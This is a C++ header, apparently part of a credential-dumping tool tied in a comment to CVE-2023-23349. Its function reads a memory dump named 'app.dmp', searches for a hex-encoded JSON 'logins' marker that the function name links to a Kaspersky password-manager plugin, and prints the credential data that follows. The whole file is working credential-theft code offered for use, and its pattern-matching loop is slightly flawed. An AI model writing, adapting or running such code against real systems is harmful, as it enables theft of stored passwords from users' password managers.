#pragma once
#include <iostream>
#include <fstream>
#include <vector>
#include <string>

/*CVE-2023-23349*/

int getCredsEntrieskasperskyPlugin() {
    std::ifstream file("app.dmp", std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    std::vector<unsigned char> searchPattern = { 0x22, 0x5b, 0x5c, 0x22, 0x7b, 0x5c, 0x5c, 0x5c, 0x22, 0x6c, 0x6f, 0x67, 0x69, 0x6e, 0x73, 0x5c, 0x5c, 0x5c, 0x22, 0x3a };
    std::vector<unsigned char> foundData;

    while (!file.eof()) {
        unsigned char c;
        file.read(reinterpret_cast<char*>(&c), sizeof(c));

        if (c == searchPattern[foundData.size()]) {
            foundData.push_back(c);
            if (foundData.size() == searchPattern.size()) {
                // We found the search pattern, now collect data until find specific bytes (10)
                std::vector<unsigned char> extractedData;
                int consecutiveSpaces = 0;

                while (!file.eof()) {
                    file.read(reinterpret_cast<char*>(&c), sizeof(c));
                    if (c == 0x10) {
                        consecutiveSpaces++;
                        if (consecutiveSpaces == 1) {
                            break; // Find (10)
                        }
                    }
                    else {
                        consecutiveSpaces = 0;
                    }
                    extractedData.push_back(c);
                }

                // Convert the binary data to a UTF-8 string
                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());

                // Print the extracted UTF-8 string
                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;

                foundData.clear();
            }
        }
        else {
            foundData.clear();
        }
    }

    file.close();
    return 0;
}
